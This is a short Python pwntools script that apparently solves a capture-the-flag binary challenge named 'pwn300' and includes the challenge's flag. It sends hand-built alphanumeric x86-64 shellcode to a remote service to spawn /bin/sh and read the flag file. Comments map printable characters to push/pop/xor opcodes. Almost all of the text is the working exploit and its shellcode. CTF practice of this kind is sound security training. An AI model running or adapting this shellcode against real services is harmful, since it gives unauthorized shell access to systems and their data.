#!/usr/bin/env python
# -*- coding: ascii -*-
from pwn import *

# Bugs_Bunny{ITs_asm_and_its_easy_But_need_more_skills!!}

host , port = '54.153.19.139' , 5256
host , port = '192.168.78.133' , 4000
y = remote( host , port )

e = ELF( 'pwn300' )

'''
0x20 ~ 0x7f
P   = push rax
j;  = push 0x3b
X   = pop rax
T   = push rsp
_   = pop rdi
4;  = xor al, 0x3b
^   = pop rsi
Z   = pop rdx
Y   = pop rcx
'''

'''
    push 0x3b
    pop rax
    xor al, 0x3b
    push rax
    push rax
    pop rsi
    pop rdx

    pop rax
    pop rax
    pop rax
    pop rax
    pop rax
    pop rax
    pop rax
    pop rax
    pop rax
    pop rax
    pop rax
    pop rax

    push 0x3b3b3e34
    pop rax
    xor rax, 0x3b3b3b3b
    push rax

    pop rax
    pop rax
    pop rax
    pop rax
    push 0x3b
    pop rax
    push rsp
    pop rdi
    push 0x3b
    pop rcx
    pop rcx
    pop rcx
'''

sc = 'j;X4;PP^ZXXXXXXXXXXXXh4>;;XH5;;;;PXXXXj;XT_j;YYY' + 'D' * 0x20 + '/bin/sh\x00' 


y.sendline( sc )

y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()